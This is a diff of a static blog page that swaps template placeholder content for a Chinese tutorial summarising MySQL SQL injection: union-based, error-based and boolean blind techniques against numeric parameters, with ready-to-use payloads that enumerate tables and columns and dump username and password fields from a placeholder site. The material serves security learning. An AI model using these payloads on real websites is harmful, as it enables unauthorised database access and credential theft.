@@ -6,23 +6,23 @@
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="description" content="马浩珍在 Github 上的个人博客">
+    <meta name="description" content="medition在Github上的个人博客">
     <meta name="keyword" content="null">
     <meta name="theme-color" content="#600090">
     <meta name="msapplication-navbutton-color" content="#600090">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="#600090">
     <link rel="shortcut icon" href="https://cdn4.iconfinder.com/data/icons/ionicons/512/icon-person-128.png">
-    <link rel="alternate" type="application/atom+xml" title="test" href="/atom.xml">
+    <link rel="alternate" type="application/atom+xml" title="medition" href="/atom.xml">
     <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css">
     <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.css">
     <title>
         
-        Hola 2016｜Haojen&#39;s blog
+        MySQL注入总结｜medition&#39;s blog
         
     </title>
 
-    <link rel="canonical" href="http://haojen.github.io/2016/05/26/MysqlInjection/">
+    <link rel="canonical" href="http://medition.github.io/2016/05/26/MysqlInjection/">
 
     <!-- Bootstrap Core CSS -->
     <link rel="stylesheet" href="/css/bootstrap.min.css">
@@ -56,7 +56,7 @@
             </button>
             <a class="navbar-brand animated pulse" href="/">
                 <span class="brand-logo">
-                    test
+                    medition
                 </span>
                 's Blog
             </a>
@@ -137,23 +137,23 @@
         <div class="row">
             <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1 text-center">
                 <div class="post-heading">
-                    <h1>Hola 2016</h1>
+                    <h1>MySQL注入总结</h1>
                     
-                    <h2 class="subheading">hi, I&#39;m haojen ma</h2>
+                    <h2 class="subheading">MySQL注入总结</h2>
                     
                     <span class="meta">
-                         作者 Haojen Ma
+                         作者 medition
                         <span>
                           日期 2016-05-26
                          </span>
                     </span>
                     <div class="tags text-center">
                         
-                        <a class="tag" href="/tags/#Movies"
-                           title="Movies">Movies</a>
+                        <a class="tag" href="/tags/#Web Security"
+                           title="Web Security">Web Security</a>
                         
-                        <a class="tag" href="/tags/#Life"
-                           title="Life">Life</a>
+                        <a class="tag" href="/tags/#Mysql Injection"
+                           title="Mysql Injection">Mysql Injection</a>
                         
                     </div>
                 </div>
@@ -162,7 +162,7 @@
     </div>
     <div class="post-title-haojen">
         <span>
-            Hola 2016
+            MySQL注入总结
         </span>
     </div>
 </header>
@@ -173,9 +173,7 @@
         <div class="row">
             <!-- Post Container -->
             <div class="col-lg-8 col-lg-offset-1 col-sm-9 post-container">
-                <p>#MySQL注入总结（所有例子均以数字型注入为例）</p>
-<p>##0x00 Union Injection</p>
-<ul>
+                <h1 id="MySQL注入总结（以数字型注入为例）"><a href="#MySQL注入总结（以数字型注入为例）" class="headerlink" title="MySQL注入总结（以数字型注入为例）"></a>MySQL注入总结（以数字型注入为例）</h1><h2 id="0x00-Union-Injection"><a href="#0x00-Union-Injection" class="headerlink" title="0x00 Union Injection"></a>0x00 Union Injection</h2><ul>
 <li>判断注入点(数字型)</li>
 </ul>
 <figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">www.site.com/xxx.php?id=1</div><div class="line">www.site.com/xxx.php?id=1&apos; -&gt;不正常，可能存在注入</div></pre></td></tr></table></figure>
@@ -199,8 +197,7 @@
 <li>mysql5.0以上版本注入方法</li>
 </ul>
 <figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">1.获取当前数据库中的表</div><div class="line">www.site.com/xxx.php?id=1 and 1=2 union select group_concat(table_name) from information_schema.tables where table_schema=database()</div><div class="line">假设有user表</div><div class="line">2.获取某张表中的列</div><div class="line">www.site.com/xxx.php?id=1 and 1=2 union select group_concat(column_name) from information_schema.columns where table_name=0x75736572 &lt;表名的16进制（此处为user）&gt;</div><div class="line">假设有user，pass，id三个字段</div><div class="line">3.获取数据</div><div class="line">www.site.com/xxx.php?id=1 and 1=2 union select 1,concat(user,0x3a,pass,0x3a,id),3,4,5,6 from user</div><div class="line">其中0x3a是分隔符 :</div></pre></td></tr></table></figure>
-<p>##0x01 Error-based Injection</p>
-<ul>
+<h2 id="0x01-Error-based-Injection"><a href="#0x01-Error-based-Injection" class="headerlink" title="0x01 Error-based Injection"></a>0x01 Error-based Injection</h2><ul>
 <li>场景<br>  此种注入适用于union查询不可用，但是页面有MySQL的报错信息</li>
 <li>原理</li>
 </ul>
@@ -208,10 +205,19 @@
 <ul>
 <li>POC</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">根据原理，我们构造出类似于以下的SQL语句:</div><div class="line">select count(*),CONCAT(version(),0x3a,ROUND(RAND()*2))a from information_schema.TABLES GROUP BY a </div><div class="line">或者</div><div class="line">select sum(version),CONCAT(version(),0x3a,ROUND(RAND()*2))a from information_schema.TABLES GROUP BY a </div><div class="line">(0x3a是分隔符:)会报如下的错误，就能拿到我们想要的信息了</div><div class="line">[Err] 1062 - Duplicate entry &apos;5.5.28:2&apos; for key &apos;group_key&apos;</div><div class="line">```	</div><div class="line">- 利用语句</div></pre></td></tr></table></figure>
-<p>www.site.com/xxx.php?id=1   -&gt;存在注入<br>此种方法的利用语句是:<br>www.site.com/xxx.php?id=1 and (select 1 from (payload)b) {payload为上面POC<br>中提到的构造的语句}<br>如，获取当前数据库中一张表名的注入语句为:<br>www.site.com/xxx.php?id=1 and (select 1 from (select count(<em>),CONCAT((select table_name from information_schema.tables where table_schema=database() limit 0,1),0x3a,ROUND(RAND()</em>2))a from information_schema.TABLES GROUP BY a)b)<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">## 0x02 Blind Injection</div><div class="line">- 场景</div></pre></td></tr></table></figure></p>
-<p>此种注入既不报错，union查询也不回显，SQL语句正确时返回正确页面，错误时返回异常页面<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">- 利用思路</div></pre></td></tr></table></figure></p>
-<p>充分利用数据库的特性和内置函数，通过一系列的暴力破解来达到获取数据的目的。举个例子,获取当前数据库名第一位的一种payload为:<br>select ascii(substr(database(),1,1)) from information_schema.tables limit 0,1<br>利用语句为:<br>www.site.com/xxx.php?id=1  and (select if((payload)&gt;99,1,0))  -&gt; 返回正确<br>www.site.com/xxx.php?id=1  and (select if((payload)&gt;100,1,0))  -&gt; 返回正确<br>www.site.com/xxx.php?id=1  and (select if((payload)&gt;101,1,0))  -&gt; 返回错误<br>则数据库第一位为 e（对应的ascii为101）<br>照此可以拿到所有想要的信息<br>```</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">根据原理，我们构造出类似于以下的SQL语句:</div><div class="line">select count(*),CONCAT(version(),0x3a,ROUND(RAND()*2))a from information_schema.TABLES GROUP BY a </div><div class="line">或者</div><div class="line">select sum(version),CONCAT(version(),0x3a,ROUND(RAND()*2))a from information_schema.TABLES GROUP BY a </div><div class="line">(0x3a是分隔符:)会报如下的错误，就能拿到我们想要的信息了</div><div class="line">[Err] 1062 - Duplicate entry &apos;5.5.28:2&apos; for key &apos;group_key&apos;</div></pre></td></tr></table></figure>
+<ul>
+<li>利用语句</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">www.site.com/xxx.php?id=1   -&gt;存在注入</div><div class="line">此种方法的利用语句是:</div><div class="line">www.site.com/xxx.php?id=1 and (select 1 from (payload)b) &#123;payload为上面POC中提到的构造的语句&#125;</div><div class="line">如，获取当前数据库中一张表名的注入语句为:</div><div class="line">www.site.com/xxx.php?id=1 and (select 1 from (select count(*),CONCAT((select table_name from information_schema.tables where table_schema=database() limit 0,1),0x3a,ROUND(RAND()*2))a from information_schema.TABLES GROUP BY a)b)</div></pre></td></tr></table></figure>
+<h2 id="0x02-Blind-Injection"><a href="#0x02-Blind-Injection" class="headerlink" title="0x02 Blind Injection"></a>0x02 Blind Injection</h2><ul>
+<li>场景</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">此种注入既不报错，union查询也不回显，SQL语句正确时返回正确页面，错误时返回异常页面</div></pre></td></tr></table></figure>
+<ul>
+<li>利用思路</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">充分利用数据库的特性和内置函数，通过一系列的暴力破解来达到获取数据的目的。举个例子,获取当前数据库名第一位的一种payload为:</div><div class="line">select ascii(substr(database(),1,1)) from information_schema.tables limit 0,1</div><div class="line">利用语句为:</div><div class="line">www.site.com/xxx.php?id=1  and (select if((payload)&gt;99,1,0))  -&gt; 返回正确</div><div class="line">www.site.com/xxx.php?id=1  and (select if((payload)&gt;100,1,0))  -&gt; 返回正确</div><div class="line">www.site.com/xxx.php?id=1  and (select if((payload)&gt;101,1,0))  -&gt; 返回错误</div><div class="line">则数据库第一位为 e（对应的ascii为101）</div><div class="line">照此可以拿到所有想要的信息</div></pre></td></tr></table></figure>
 <h2 id="0x03-Injection-Cheat-Sheet"><a href="#0x03-Injection-Cheat-Sheet" class="headerlink" title="0x03  Injection Cheat Sheet"></a>0x03  Injection Cheat Sheet</h2><table>
 <thead>
 <tr>
@@ -326,11 +332,6 @@
 
                 <ul class="pager">
                     
-                    <li class="previous">
-                        <a href="/2017/03/12/hello-world/" data-toggle="tooltip" data-placement="top"
-                           title="Hello World">&larr; Previous Post</a>
-                    </li>
-                    
                     
                 </ul>
 
@@ -342,7 +343,7 @@
 
             <div class="hidden-xs col-sm-3 toc-col">
                 <div class="toc-wrap">
-                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-Injection-Cheat-Sheet"><span class="toc-text">0x03  Injection Cheat Sheet</span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#MySQL注入总结（以数字型注入为例）"><span class="toc-text">MySQL注入总结（以数字型注入为例）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-Union-Injection"><span class="toc-text">0x00 Union Injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-Error-based-Injection"><span class="toc-text">0x01 Error-based Injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-Blind-Injection"><span class="toc-text">0x02 Blind Injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-Injection-Cheat-Sheet"><span class="toc-text">0x03  Injection Cheat Sheet</span></a></li></ol></li></ol>
                 </div>
             </div>
         </div>
@@ -364,11 +365,11 @@
                     </h5>
                     <div class="tags">
                         
-                        <a class="tag" href="/tags/#Movies"
-                           title="Movies">Movies</a>
+                        <a class="tag" href="/tags/#Web Security"
+                           title="Web Security">Web Security</a>
                         
-                        <a class="tag" href="/tags/#Life"
-                           title="Life">Life</a>
+                        <a class="tag" href="/tags/#Mysql Injection"
+                           title="Mysql Injection">Mysql Injection</a>
                         
                     </div>
                 </section>
@@ -409,7 +410,7 @@
 
                 </ul>
                 <p class="copyright text-muted">
-                    Copyright &copy; test 2017
+                    Copyright &copy; medition 2017
                     <br>
                     <span id="busuanzi_container_site_pv" style="font-size: 12px;">PV: <span id="busuanzi_value_site_pv"></span> Times</span>
                     <br>
@@ -446,7 +447,7 @@
 <script>
     // only load tagcloud.js in tag.html
     if($('#tag_cloud').length !== 0){
-        async("http://haojen.github.io/js/jquery.tagcloud.js",function(){
+        async("http://medition.github.io/js/jquery.tagcloud.js",function(){
             $.fn.tagcloud.defaults = {
                 //size: {start: 1, end: 1, unit: 'em'},
                 color: {start: '#bbbbee', end: '#0085a1'},
